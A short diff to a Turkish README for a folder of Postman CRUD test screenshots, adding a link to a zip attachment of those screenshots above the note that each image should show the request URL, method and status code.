@@ -1,3 +1,4 @@
+[SignalGap_postman_test_screenshots_.zip](https://github.com/user-attachments/files/33641606/SignalGap_postman_test_screenshots_.zip)
 # Postman ekran görüntüleri
 
 CRUD testlerinin ekran görüntüleri burada tutuluyor. Her görselde istek adresi, yöntem ve yanıtın durum kodu görünmeli.
